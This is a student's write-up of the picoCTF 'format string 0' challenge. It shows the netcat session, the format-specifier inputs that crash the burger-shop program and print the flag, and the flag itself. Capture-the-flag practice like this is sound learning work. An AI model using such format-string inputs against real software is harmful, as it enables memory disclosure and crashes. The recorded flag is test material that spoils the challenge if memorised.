# format string 0

**Flag:** `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}`

## My Solve
Firstly looking at the challenge name `format string 0` and the hint I figured out that we need to somehow make use of format specifiers to solve the challenge.
* Looking at the code it's clear that firstly a file named `flag.txt` has to be present in our working directory.
  ![image](https://github.com/user-attachments/assets/4d078bd0-5840-4477-b68d-eb4bd99568b6)

```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ echo "flag" > flag.txt
```
* After that i initiated the challenge
```
devarjya27@devarjya27-VirtualBox:~/Cryptonite TP2$ nc mimas.picoctf.net 55252
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
```
* Here we can clearly see that `Gr%114d_Cheese` is on the menu and has a format specifier `%114d` so thats our input for this instance. Thus satifying the 2 conditions in the code.

  ![image](https://github.com/user-attachments/assets/5da018d1-bbcd-4c52-9b0d-2454eb0260be)

```
Enter your recommendation: Gr%114d_Cheese 
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
```
* Now only `Cla%sic_Che%s%steak` has the format specifier `%s` so thats our input for this instance.
![image](https://github.com/user-attachments/assets/93080017-7b07-4669-b715-ebb18f7aaace)

```
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
```
And thus we get our flag

## Incorrect Tangents I Went On
Initially when i looked at the code for the program. The following part stuck out to me.

![image](https://github.com/user-attachments/assets/5901f25f-11dd-455c-a7c4-3f26bdfd84af)

I thought that if we input a random string greater than `2 * BUFSIZE` i.e. 64 then `serve_bob` would be called from within `serve_patrick` but it did not work as our input must be on the `menu` therefore `Gr%114d_Cheese` works which is on the menu and inputs a integer whose size is more than 64 thus calling the `serve_bob` function.

## What I Learned
Its never a good idea to expect input from the user which includes format specifiers as it can lead to unexpected behaviour which can be dangerous. As the challenge was relatively easy I did not require any references.
